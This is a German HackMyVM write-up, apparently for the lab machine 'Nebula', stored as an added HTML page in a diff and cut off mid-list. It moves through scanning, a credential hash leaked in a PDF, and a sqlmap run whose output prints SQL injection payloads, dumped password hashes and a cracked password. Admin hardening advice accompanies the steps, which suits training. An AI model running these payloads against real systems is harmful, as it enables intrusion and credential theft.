@@ -1,0 +1,677 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nebula - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body>
+ <div class="nav-wrapper">
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a>
+            <a href="../../index.html">HackMyVM</a>
+            <a href="../../vulnyx.html">Vulnyx</a>
+            <a href="../../vulnhub.html">Vulnhub</a>
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <!-- Titel und Schwierigkeitsgrad angepasst -->
+        <h1>Nebula - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Schwierigkeitsgrad angepasst, Farbe wird durch CSS gesteuert (Easy = Grün) -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <!-- Tool-Liste aus dem Text extrahiert -->
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">vi</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">nikto</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">wappalyzer</div> <!-- Implizit erwähnt -->
+                 <div class="tool-item">wget</div>
+                 <div class="tool-item">sqlmap</div>
+                 <!-- <div class="tool-item">awk</div> --> <!-- Fehlerhaft verwendet, aber Teil des Prozesses -->
+                 <div class="tool-item">ssh</div>
+                 <div class="tool-item">sudo</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">find</div>
+                 <div class="tool-item">awk</div> <!-- Korrekte Verwendung für PE -->
+                 <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis generiert -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#poc">Proof of Concept (Privilege Escalation Path)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.110	08:00:27:1a:bb:4f	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um das lokale Netzwerk mittels ARP-Protokoll nach aktiven Geräten zu scannen. Es listet die IP-Adresse, die dazugehörige MAC-Adresse und den Hersteller der Netzwerkkarte auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein aktives Gerät wurde unter der IP-Adresse `192.168.2.110` gefunden. Die MAC-Adresse `08:00:27:1a:bb:4f` gehört zum Hersteller `PCS Systemtechnik GmbH`, was typischerweise auf eine VirtualBox-VM hinweist. Die Ziel-IP wurde erfolgreich identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die IP `192.168.2.110` als Ziel für nachfolgende Scans. Behalten Sie die VirtualBox-Information im Hinterkopf, falls spezifische VM-Exploits relevant werden könnten.
+            <br><strong>Empfehlung (Admin):</strong> Implementieren Sie Netzwerküberwachung, um unautorisierte ARP-Scans zu erkennen. Segmentieren Sie das Netzwerk, um die Reichweite solcher Scans zu begrenzen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <!-- Kein Output, da vi interaktiv ist -->
+                 </div>
+             </div>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat /etc/hosts</span></div>
+                      <pre>
+127.0.0.1	localhost
+192.168.2.110   nebula.hmv
+                      </pre>
+                  </div>
+              </div>
+            <p class="analysis"><strong>Analyse:</strong> Die lokale Host-Datei (`/etc/hosts`) auf dem Angreifer-System wird bearbeitet (`vi`) und anschließend ihr Inhalt angezeigt (`cat`). Der Eintrag `192.168.2.110 nebula.hmv` wurde hinzugefügt, um den Hostnamen `nebula.hmv` lokal auf die Ziel-IP aufzulösen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein nützlicher Schritt, um die Interaktion mit dem Ziel, insbesondere mit Webdiensten, die möglicherweise auf Hostnamen angewiesen sind (Virtual Hosts), zu vereinfachen. Der Name `nebula.hmv` wird nun für weitere Tests verwendet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den definierten Hostnamen `nebula.hmv` in allen weiteren Befehlen, die auf das Ziel zugreifen, insbesondere bei Web-Scans und Browser-Interaktionen.
+            <br><strong>Empfehlung (Admin):</strong> Dies ist eine lokale Konfiguration des Angreifers. Es ist jedoch wichtig zu wissen, dass Angreifer versuchen werden, auf Dienste über verschiedene Hostnamen zuzugreifen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.110 -p- -Pn | grep open</span></div>
+                     <pre>
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein `nmap`-Scan wird gegen die Ziel-IP `192.168.2.110` durchgeführt.
+                <ul>
+                    <li>`-sS`: SYN (Stealth) Scan.</li>
+                    <li>`-sV`: Service/Version Detection.</li>
+                    <li>`-A`: Aggressive Optionen (OS Detection, Script Scan, Traceroute).</li>
+                    <li>`-T5`: "Insane" Timing (sehr schnell).</li>
+                    <li>`-p-`: Scannt alle 65535 TCP-Ports.</li>
+                    <li>`-Pn`: Überspringt die Host-Discovery (Ping-Scan) und behandelt das Ziel als online. Dies ist nützlich, wenn das Ziel auf Pings nicht antwortet.</li>
+                    <li>`| grep open`: Filtert die Ausgabe, um nur offene Ports anzuzeigen.</li>
+                </ul></p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert zwei offene Ports: SSH auf Port 22 (OpenSSH 8.2p1) und HTTP auf Port 80 (Apache 2.4.41). Die Verwendung von `-Pn` war notwendig, da der Host möglicherweise auf Pings nicht geantwortet hat.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie die vollständige `nmap`-Ausgabe. Untersuchen Sie den Webserver auf Port 80 genauer. Prüfen Sie die OpenSSH- und Apache-Versionen auf bekannte Schwachstellen.
+             <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Firewall-Regeln; möglicherweise blockiert sie ICMP (Ping). Beschränken Sie den Zugriff auf SSH auf notwendige IPs. Halten Sie alle Dienste aktuell.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.110 -p- -Pn</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-27 00:26 CEST
+Nmap scan report for nebula.hmv (192.168.2.110)
+Host is up (0.00015s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 63:9c:2e:57:91:af:1e:2e:25:ba:55:fd:ba:48:a8:60 (RSA)
+|   256 d0:05:24:1d:a8:99:0e:d6:d1:e5:c5:5b:40:6a:b9:f9 (ECDSA)
+|_  256 d8:4a:b8:86:9d:66:6d:7f:a4:cb:d0:73:a1:f4:b5:19 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Nebula Lexus Labs
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+MAC Address: 08:00:27:1A:BB:4F (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|storage-misc
+Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), Synology DiskStation Manager 5.X (91%), Netgear RAIDiator 4.X (87%)
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:netgear:raidiator:4.2.28
+Aggressive OS guesses: Linux 4.15 - 5.8 (97%), Linux 5.0 - 5.4 (97%), Linux 5.0 - 5.5 (94%), Linux 2.6.32 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.9 (91%), Linux 3.4 - 3.10 (91%), Synology DiskStation Manager 5.2-5644 (91%), Linux 2.6.32 - 3.10 (91%), Linux 2.6.32 - 3.13 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.15 ms nebula.hmv (192.168.2.110)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.43 seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dies ist die vollständige Ausgabe des vorherigen `nmap`-Scans ohne `grep`-Filterung.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die offenen Ports 22 (SSH 8.2p1) und 80 (Apache 2.4.41). Der Titel der Webseite lautet "Nebula Lexus Labs". Die MAC-Adresse bestätigt VirtualBox. Nmap hat Schwierigkeiten bei der OS-Erkennung ("Warning: OSScan results may be unreliable...", "No exact OS matches for host"), da anscheinend keine geschlossenen Ports gefunden wurden (alle 65533 nicht angezeigten Ports sind als "filtered" markiert). Dies deutet auf eine Firewall hin, die Pakete an geschlossene Ports verwirft (DROP) anstatt sie abzulehnen (REJECT mit RST). Nmap schätzt dennoch ein Linux-System (Kernel 4.x/5.x). Die SSH-Hostkeys werden angezeigt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Firewall erschwert die OS-Erkennung und das Finden geschlossener Ports, aber die offenen Ports sind klar. Konzentrieren Sie sich auf den Apache-Webserver. Untersuchen Sie die Webseite "Nebula Lexus Labs" genauer.
+            <br><strong>Empfehlung (Admin):</strong> Eine Firewall, die Pakete an geschlossene Ports verwirft, ist eine gängige Konfiguration, die das Scannen erschwert. Stellen Sie sicher, dass die Firewall nur die notwendigen Ports (22, 80) öffnet.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.110</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.110
++ Target Hostname:    192.168.2.110
++ Target Port:        80
++ Start Time:         2024-04-27 00:21:48 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.41 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. [...]
++ /: The X-Content-Type-Options header is not set. [...]
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). [...]
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /img/: Directory indexing found.
++ /img/: This might be interesting.
++ /login/: Cookie PHPSESSID created without the httponly flag. [...]
++ /login/: This might be interesting.
++ 8102 requests: 0 error(s) and 8 item(s) reported on remote host
++ End Time:           2024-04-27 00:21:58 (GMT2) (10 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `nikto` scannt den Webserver auf Port 80 nach bekannten Schwachstellen und interessanten Funden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto findet:
+                <ul>
+                    <li>Fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`).</li>
+                    <li>Veraltete Apache-Version (2.4.41).</li>
+                    <li>Interessante Verzeichnisse `/img/` (mit Directory Indexing) und `/login/`.</li>
+                    <li>Ein PHPSESSID-Cookie im `/login/`-Verzeichnis ohne `HttpOnly`-Flag (Risiko für XSS).</li>
+                    <li>Eine Warnung, dass der Server auf ungültige HTTP-Methoden antwortet, was zu False Positives führen könnte.</li>
+                </ul>
+            Die Verzeichnisse `/img/` und insbesondere `/login/` sind die wichtigsten Funde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie `/img/` manuell. Konzentrieren Sie sich auf das Verzeichnis `/login/`. Führen Sie Directory Enumeration auf `/` und `/login/` durch. Testen Sie `/login/` auf gängige Schwachstellen (SQLi, Brute-Force, XSS).
+            <br><strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Sicherheitsheader. Aktualisieren Sie Apache. Deaktivieren Sie Directory Indexing. Setzen Sie das `HttpOnly`-Flag für Session-Cookies. Konfigurieren Sie den Webserver so, dass er auf ungültige HTTP-Methoden korrekt mit einem Fehler antwortet.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://nebula.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '404' -e --no-error -k</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.6
+[...]
+===============================================================
+http://nebula.hmv/index.php            (Status: 200) [Size: 3511]
+http://nebula.hmv/img                  (Status: 301) [Size: 306] [--> http://nebula.hmv/img/]
+http://nebula.hmv/login                (Status: 301) [Size: 308] [--> http://nebula.hmv/login/]
+http://nebula.hmv/joinus               (Status: 301) [Size: 309] [--> http://nebula.hmv/joinus/]
+===============================================================
+[...]
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um das Root-Verzeichnis von `http://nebula.hmv` nach Verzeichnissen und Dateien zu durchsuchen. Es verwendet die `directory-list-2.3-medium.txt` und eine lange Liste von Dateierweiterungen. 404-Fehler werden ignoriert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet `index.php` und bestätigt die bereits von `nikto` gefundenen Verzeichnisse `/img/` und `/login/`. Zusätzlich wird ein neues Verzeichnis `/joinus/` entdeckt. Alle Verzeichnisse leiten mit Status 301 auf eine Version mit abschließendem Schrägstrich weiter.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Verzeichnisse `/login/` und `/joinus/` genauer. Führen Sie `gobuster` oder `dirb` auch innerhalb dieser Verzeichnisse aus.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur beabsichtigte Verzeichnisse und Dateien über das Web zugänglich sind. Implementieren Sie eine robuste Zugriffskontrolle.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Wappalyzer Browser Plugin Output]</div>
+                     <pre>
+# Analyse von: http://nebula.hmv/index.php#about-us
+Web Server: Apache HTTP Server 2.4.41
+Programmiersprache: PHP
+Betriebssysteme: Ubuntu
+CDN: jsDelivr
+UI Frameworks: Bootstrap 5.3.0
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Das Browser-Plugin `Wappalyzer` (oder ein ähnliches Tool) wurde verwendet, um die auf der Webseite `http://nebula.hmv/index.php` eingesetzten Technologien zu identifizieren.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Wappalyzer identifiziert Apache 2.4.41, PHP, Ubuntu, das CDN jsDelivr und das UI-Framework Bootstrap 5.3.0. Dies bestätigt die Server-Software und gibt Hinweise auf die verwendete Backend-Sprache (PHP) und das Frontend-Framework (Bootstrap).</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach bekannten Schwachstellen in PHP-Anwendungen allgemein sowie spezifisch in Bootstrap 5.3.0, falls benutzerdefinierte Implementierungen fehlerhaft sein könnten. Die PHP-Information ist besonders relevant für die Suche nach Code-Injection, LFI/RFI etc.
+              <br><strong>Empfehlung (Admin):</strong> Halten Sie alle Komponenten (PHP, Bootstrap-Bibliotheken) auf dem neuesten Stand. Konfigurieren Sie PHP sicher (z.B. `display_errors` auf Off in Produktion).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Manual Browser Interaction / Page Content Review]</div>
+                     <pre>
+# Zugriff auf: http://nebula.hmv/joinus/
+# Sichtbarer Inhalt auf der Seite (Auszug):
+Welcome to Nebula Labs!
+
+Explore the secrets of Nebula Lexus Labs
+[...]
+If you believe you have what it takes to join us and uncover the secrets of the universe, follow these steps:
+
+    Download and complete our application form here.
+    Send the completed form to our email address: join@nebula-lexus-labs.com
+[...]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Seite im Verzeichnis `/joinus/` wird manuell im Browser betrachtet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Seite enthält einen Link zum Herunterladen eines Bewerbungsformulars ("Download... form here.") und eine E-Mail-Adresse (`join@nebula-lexus-labs.com`). Die Domain `nebula-lexus-labs.com` ist neu und könnte relevant sein. Der Benutzername `join` ist eine Möglichkeit.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Finden Sie den genauen Link zum Download-Formular (möglicherweise durch Untersuchen des HTML-Quellcodes). Laden Sie das Formular herunter und analysieren Sie es. Fügen Sie `join` zur Liste potenzieller Benutzernamen hinzu. Recherchieren Sie die Domain `nebula-lexus-labs.com` (DNS, Whois).
+             <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Download-Links korrekt funktionieren und nur die beabsichtigten Dateien heruntergeladen werden können. Überwachen Sie die angegebene E-Mail-Adresse.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://nebula.hmv/joinus/ -x [...] -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.6
+[...]
+===============================================================
+http://nebula.hmv/joinus/index.php            (Status: 200) [Size: 1712]
+http://nebula.hmv/joinus/application_form.pdf (Status: 200) [Size: 83859]
+===============================================================
+[...]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` wird gezielt auf das Verzeichnis `/joinus/` angesetzt, um darin nach Dateien und Unterverzeichnissen zu suchen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet die `index.php` (die vermutlich die zuvor angezeigte Seite ist) und die Datei `application_form.pdf`. Dies ist das auf der Seite erwähnte Bewerbungsformular.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Laden Sie die Datei `application_form.pdf` mit `wget` oder über den Browser herunter und untersuchen Sie sie auf Metadaten oder versteckte Informationen.
+             <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass PDF-Dateien und andere Dokumente keine unbeabsichtigten Metadaten oder sensible Informationen enthalten, bevor sie veröffentlicht werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://nebula.hmv/joinus/application_form.pdf</span></div>
+                    <pre>
+--2024-04-27 00:58:05--  http://nebula.hmv/joinus/application_form.pdf
+Auflösen des Hostnamens nebula.hmv (nebula.hmv)… 192.168.2.110
+Verbindungsaufbau zu nebula.hmv (nebula.hmv)|192.168.2.110|:80 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 83859 (82K) [application/pdf]
+Wird in application_form.pdf gespeichert.
+
+application_form.pdf    100%[===================>]  81,89K  --.-KB/s    in 0s
+
+2024-04-27 00:58:05 (248 MB/s) - application_form.pdf gespeichert [83859/83859]
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Datei `application_form.pdf` wird mit `wget` vom Webserver heruntergeladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Download war erfolgreich. Die PDF-Datei steht nun zur lokalen Analyse bereit.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Öffnen Sie die PDF-Datei und suchen Sie nach Hinweisen, Kommentaren, Metadaten oder versteckten Feldern. Verwenden Sie Tools wie `pdfinfo` oder `exiftool`.
+            <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Serverlogs auf ungewöhnliche Download-Aktivitäten.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[PDF Content / Metadata Analysis]</div>
+                     <pre>
+# Inhalt oder Metadaten aus application_form.pdf (Auszug):
+
+[...]
+What to do when you are accepted
+[...] access to the Meeting URL in the website.
+The link will be like:
+https://nebulalabs.org/meetings?user=admin&password=<span class="password">d46df8e6a5627debf930f7b5c8f3b083</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Bei der Untersuchung der heruntergeladenen PDF-Datei (`application_form.pdf`) wird ein Textabschnitt gefunden, der eine URL enthält.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Kritischer Fund!** Die PDF-Datei enthält eine URL (`https://nebulalabs.org/meetings`), die scheinbar Zugangsdaten als GET-Parameter übergibt: `user=admin` und `password=<span class="password">d46df8e6a5627debf930f7b5c8f3b083</span>`. Der Passwortwert ist ein MD5-Hash (32 hexadezimale Zeichen).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, den MD5-Hash `<span class="password">d46df8e6a5627debf930f7b5c8f3b083</span>` mit Tools wie `hashcat`, `john` oder Online-Crackern (z.B. CrackStation) zu knacken. Testen Sie die Zugangsdaten (`admin` / geknacktes Passwort) auf der Login-Seite (`http://nebula.hmv/login/`).
+             <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Entfernen Sie sofort sensible Informationen wie Zugangsdaten aus öffentlichen Dokumenten (PDFs etc.). Verwenden Sie niemals MD5 zum Hashen von Passwörtern. Verwenden Sie starke, gesalzene Hashing-Algorithmen (bcrypt, Argon2). Übergeben Sie Zugangsdaten niemals als GET-Parameter in URLs.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Manual Browser Interaction / Dashboard Review]</div>
+                     <pre>
+# Zugriff auf: http://nebula.hmv/login/dashboard.php (nach Login, vermutlich mit admin/geknacktem_hash)
+# Relevanter Inhalt auf der Seite:
+
+Search Centrals
+<a href="meeting_room.php">Meeting Room</a>
+If you are from the PMC Central, please enter by SSH.
+
+# Tabelle (oder ähnliche Struktur) auf der Seite:
+id	role	    username
+1	Security	pmccentral
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Nach einem (angenommenen) erfolgreichen Login auf `http://nebula.hmv/login/`, wahrscheinlich mit `admin` und dem geknackten MD5-Passwort, wird das Dashboard (`dashboard.php`) untersucht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Dashboard enthüllt wichtige Informationen:
+                <ul>
+                    <li>Einen Link zu einem "Meeting Room" (`meeting_room.php`).</li>
+                    <li>Einen Hinweis, dass Benutzer von "PMC Central" sich per SSH verbinden sollen.</li>
+                    <li>Einen Benutzernamen `pmccentral` mit der Rolle "Security".</li>
+                </ul>
+            Der Benutzername `pmccentral` ist ein wichtiger Fund für weitere Angriffsversuche, insbesondere im Kontext des SSH-Hinweises.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fügen Sie `pmccentral` zur Liste der Benutzernamen hinzu. Versuchen Sie, das Passwort für `pmccentral` zu finden oder zu erraten (möglicherweise durch SQL-Injection, falls das Dashboard Daten aus einer DB lädt, oder durch Brute-Force). Untersuchen Sie die `meeting_room.php`.
+             <br><strong>Empfehlung (Admin):</strong> Zeigen Sie in Dashboards nur die Informationen an, die für den angemeldeten Benutzer relevant sind (Least Privilege). Vermeiden Sie Hinweise auf interne Strukturen oder alternative Zugriffsmethoden (wie SSH).</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -r /home/cyber/Downloads/neu.sql -D nebuladb -T users --dump --batch</span></div>
+                      <pre>
+[...]
+[!] legal disclaimer: [...]
+[*] starting @ 01:15:27 /2024-04-27/
+
+[01:15:27] [INF] parsing HTTP request from '/home/cyber/Downloads/neu.sql'
+[01:15:27] [INF] resuming back-end DBMS 'mysql'
+[01:15:27] [INF] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2' AND 3499=3499-- ERUX
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=2' AND (SELECT 9736 FROM (SELECT(SLEEP(5)))zItq)-- LCAh
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=2' UNION ALL SELECT NULL,NULL,CONCAT(0x716a767671,0x70424a624358634d6a4e66736a5547655755704c64714e434b4c4b75586769434e596d4a4e765342,0x716a6b6271)-- -
+---
+[01:15:27] [INF] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[01:15:27] [INF] fetching columns for table 'users' in database 'nebuladb'
+[01:15:27] [INF] fetching entries for table 'users' in database 'nebuladb'
+[01:15:27] [INF] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[01:15:27] [INF] using hash method 'md5_generic_passwd'
+[...]
+> 1
+[01:15:27] [INF] using default dictionary
+[...]
+[01:15:27] [INF] starting dictionary-based cracking (md5_generic_passwd)
+[01:15:27] [INF] starting 16 processes
+[01:15:27] [INF] cracked password '<span class="password">999999999</span>' for user 'pmccentral'
+Database: nebuladb
+Table: users
+[7 entries]
++----+----------+----------------------------------------------+-------------+
+| id | is_admin | password                                     | username    |
++----+----------+----------------------------------------------+-------------+
+| 1  | 1        | <span class="password">d46df8e6a5627debf930f7b5c8f3b083</span>             | admin       |
+| 2  | 0        | <span class="password">c8c605999f3d8352d7bb792cf3fdb25b</span> (<span class="password">999999999</span>) | pmccentral  |
+| 3  | 0        | <span class="password">5f823f1ac7c9767c8d1efbf44158e0ea</span>             | Frederick   |
+| 3  | 0        | <span class="password">4c6dda8a9d149332541e577b53e2a3ea</span>             | Samuel      |
+| 5  | 0        | <span class="password">41ae0e6fbe90c08a63217fc964b12903</span>             | Mary        |
+| 6  | 0        | <span class="password">5d8cdc88039d5fc021880f9af4f7c5c3</span>             | hecolivares |
+| 7  | 1        | <span class="password">c8c605999f3d8352d7bb792cf3fdb25b</span> (<span class="password">999999999</span>) | pmccentral  | /* Duplicate? */
++----+----------+----------------------------------------------+-------------+
+
+[01:15:30] [INF] table 'nebuladb.users' dumped to CSV file [...]
+[01:15:30] [INF] fetched data logged to text files under [...]
+
+[*] ending @ 01:15:30 /2024-04-27/
+                      </pre>
+                  </div>
+              </div>
+            <p class="analysis"><strong>Analyse:</strong> `sqlmap` wird ausgeführt, um eine SQL-Injection-Schwachstelle auszunutzen, die in einer vorherigen Sitzung gefunden wurde (vermutlich über den GET-Parameter `id` in einer URL, die in `neu.sql` gespeichert ist). Das Ziel ist es, den Inhalt (`--dump`) der Tabelle `users` aus der Datenbank `nebuladb` zu extrahieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** `sqlmap` bestätigt die SQL-Injection und extrahiert die `users`-Tabelle. Wichtige Funde:
+                <ul>
+                    <li>Benutzer `admin` mit dem MD5-Hash `<span class="password">d46df8e6a5627debf930f7b5c8f3b083</span>` (bestätigt den Fund aus der PDF).</li>
+                    <li>Benutzer `pmccentral` mit dem MD5-Hash `<span class="password">c8c605999f3d8352d7bb792cf3fdb25b</span>`.</li>
+                    <li>`sqlmap` knackt den Hash für `pmccentral` erfolgreich mit seiner internen Wörterbuchfunktion und findet das Passwort `<span class="password">999999999</span>`.</li>
